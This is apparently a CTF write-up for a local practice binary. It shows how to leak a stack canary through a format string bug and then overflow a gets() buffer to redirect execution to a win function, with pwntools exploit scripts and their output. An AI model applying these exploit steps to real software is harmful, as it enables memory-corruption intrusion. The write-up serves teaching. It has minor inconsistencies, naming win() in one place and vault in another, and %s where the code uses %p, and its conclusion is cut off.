# Linux5 CTF Writeup

## Challenge Overview

This challenge introduces two key concepts: stack canary protection and return address control. The goal is to leak the stack canary value using a format string vulnerability, then craft a payload that bypasses this protection and redirects execution flow to a  win() function.

## Analysis

At the start, the binary prompts the user with:
```
I want a cookie!
```

This is followed by an input opportunity, which is vulnerable to a format string attack. The stack canary is located at a known offset and can be leaked using the `%p` format specifier. A second input is then requested:
```
Give me another one!
```

At this point, a buffer overflow can be triggered, but it must respect the canary to avoid triggering a stack smashing detection (`__stack_chk_fail`).

---
### Key Code Analysis

```c
void gate(void)

{
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Canary on guards shoulder: Gwaaaa! I want a cookie!");
  gets(local_58);
  printf(local_58);
  puts("\nCanary on guards shoulder: Gwaaaa! Give me another one!");
  gets(local_58);
  puts("The canary died from poison, the guard attacks you!");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
This binary uses:

- A buffer with a stack canary
- A call to `gets()` that allows overflowing the buffer
- A `vault` function that prints the flag, reachable only via return address hijacking


## Exploitation and Payload Strategy

The exploit is performed in two phases:

### Phase 1: Leak the Canary
Use the format string vulnerability to leak the canary at position 37 on the stack:

```python
from pwn import *

p = process('./linux5')

payload_canary_leak = b'%p' * 100
p.recvuntil(b'I want a cookie!')
p.sendline(payload_canary_leak)
p.interactive()
```

### Phase 2: Bypass Canary and Call Win

Use the exact leaked canary to craft a payload that bypasses stack protection and hijacks the return address:

```python
from pwn import *

win_addr = 0x004006b7
canary_offset = 72

p = process('./linux5')

# Step 1: Leak canary
p.recvuntil(b'I want a cookie!
')
canary_leak = '%37$p'
p.sendline(canary_leak)
leak = p.recvline().strip()
print(f'leaked canary value: {leak}')

# Step 2: Convert and craft payload
canary = int(leak, 16)
payload = b'A' * canary_offset
payload += p64(canary)           # insert exact canary value
payload += b'BBBBBBBB'           # overwrite saved RBP or padding
payload += p64(win_addr)         # overwrite return address

# Step 3: Send payload
p.recvuntil(b'Give me another one!')
p.sendline(payload)
p.interactive()
```

## Result and Solution

Upon running the full exploit, the output of solve2 (main solve script) will show:
```bash
┌──(kali㉿kali)-[~/linux_challenges/linux5]
└─$ /bin/python /home/kali/linux_challenges/linux5/solve2.py
[+] Starting local process './linux5': pid 61255
/home/kali/linux_challenges/linux5/solve2.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(canary_leak)
leaked canary value: b'0x40cf11f100202a00'
[*] Switching to interactive mode

The canary died from poison, the guard attacks you!
flag_(this_is_your_flag_if_you_
[*] Got EOF while reading in interactive
$  
```

This confirms that the return address was successfully hijacked, and the vault function was executed.

## Conclusion and Lessons

This challenge demonstrates the danger of format string vulnerabilities, especially when combined with unsafe input handling. By abusing the `%s` format specifier, which dereferences a pointer, we can leak secrets stored in memory and use them to bypass logic check

## References
- ![alt text](/img/image-8.png)
- ![alt text](/img/image-9.png)
- ![alt text](/img/image-10.png)